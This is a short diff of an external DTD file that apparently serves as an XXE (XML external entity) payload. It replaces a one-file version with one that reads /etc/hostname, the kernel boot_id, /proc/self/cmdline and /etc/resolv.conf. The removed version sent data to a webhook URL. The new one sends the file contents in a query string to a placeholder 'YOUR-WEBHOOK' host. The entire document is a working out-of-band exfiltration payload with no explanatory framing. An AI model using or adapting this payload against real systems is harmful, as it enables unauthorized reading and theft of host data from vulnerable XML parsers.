@@ -1,4 +1,7 @@
-<!ENTITY % file SYSTEM "file:///proc/sys/kernel/random/boot_id">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook-tester.ap-southeast-2.dev.atl-paas.net/0lv1w5n/exfil?x=%file;'>">
+<!ENTITY % f1 SYSTEM "file:///etc/hostname">
+<!ENTITY % f2 SYSTEM "file:///proc/sys/kernel/random/boot_id">
+<!ENTITY % f3 SYSTEM "file:///proc/self/cmdline">
+<!ENTITY % f4 SYSTEM "file:///etc/resolv.conf">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-WEBHOOK/exfil?hostname=%f1;&bootid=%f2;&cmdline=%f3;&resolv=%f4;'>">
 %eval;
 %exfil;
